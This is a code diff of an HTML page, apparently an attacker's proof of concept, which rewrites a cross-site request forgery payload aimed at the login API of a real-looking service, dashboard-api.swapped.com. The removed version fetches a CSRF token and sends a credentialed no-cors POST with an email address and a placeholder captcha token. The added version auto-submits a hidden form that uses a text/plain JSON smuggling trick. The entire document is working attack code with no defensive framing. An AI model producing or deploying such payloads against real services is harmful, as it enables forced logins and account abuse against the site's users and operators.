@@ -1,30 +1,8 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-SYNC</title></head>
-<body><pre id="out">SYNC-START</pre>
-<script>
-try {
-  // SYNC XHR для CSRF (GET — CORS должен работать т.к. ответ имеет CORS headers)
-  var xhr = new XMLHttpRequest();
-  xhr.open("GET", "https://dashboard-api.swapped.com/api/v1/auth/csrf", false);
-  xhr.send();
-  var csrf = JSON.parse(xhr.responseText).data.csrf_token;
-  
-  // POST login через no-cors (async но быстрый)
-  fetch("https://dashboard-api.swapped.com/api/v1/auth/login", {
-    method: "POST",
-    mode: "no-cors",
-    credentials: "include",
-    headers: { "Content-Type": "text/plain", "X-CSRF-Token": csrf },
-    body: JSON.stringify({ email: "platostri@proton.me", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" })
-  }).then(r => {
-    document.title = "SYNC-OK-" + r.type;
-    document.getElementById("out").textContent = "SYNC-POST sent! type=" + r.type + " csrf=" + csrf.slice(0, 12);
-  }).catch(e => {
-    document.title = "SYNC-ERR";
-    document.getElementById("out").textContent = "SYNC-ERR " + e.message + " csrf=" + csrf.slice(0, 12);
-  });
-} catch (e) {
-  document.title = "SYNC-ERR";
-  document.getElementById("out").textContent = "SYNC-ERR " + e.message;
-}
-</script></body></html>
+<html><head><meta charset="utf-8"><title>ATK-FORM-CSRF</title></head>
+<body>
+<form id="f" method="POST" action="https://dashboard-api.swapped.com/api/v1/auth/login" enctype="text/plain">
+<input type="hidden" name='{"email":"platostri@proton.me","turnstile_token":"XXXX.DUMMY.TOKEN.XXXX","csrf_token":"' value='"}'>
+</form>
+<script>document.getElementById('f').submit();</script>
+</body></html>
